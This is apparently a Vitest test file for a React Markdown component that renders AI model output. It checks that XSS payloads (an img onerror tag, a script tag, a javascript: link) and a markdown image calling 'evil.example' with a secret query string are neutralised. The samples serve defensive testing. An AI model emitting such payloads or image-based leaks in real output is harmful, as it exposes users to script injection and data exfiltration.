import { describe, expect, it } from "vitest";
import { render } from "@testing-library/react";
import { Markdown } from "../components/Markdown";

describe("Markdown safety", () => {
  it("renders raw HTML in model output as text, not as elements", () => {
    const { container } = render(<Markdown text={'<img src=x onerror="alert(1)"> <script>alert(2)</script>'} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
  });

  it("does not load remote images", () => {
    const { container } = render(<Markdown text={"![leak](https://evil.example/p.png?secret=1)"} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).toContain("image not loaded");
  });

  it("does not render images from any URL in model text", () => {
    // react-markdown's URL sanitiser drops data: URLs; that is stricter than needed and fine.
    const { container } = render(<Markdown text={"![ok](data:image/png;base64,iVBORw0KGgo=)"} />);
    expect(container.querySelector("img[src^='http']")).toBeNull();
  });

  it("links never become anchors that navigate the app", () => {
    const { container } = render(<Markdown text={"[click](https://example.com/a) [js](javascript:alert(1))"} />);
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("click");
    expect(container.textContent).toContain("js");
  });
});
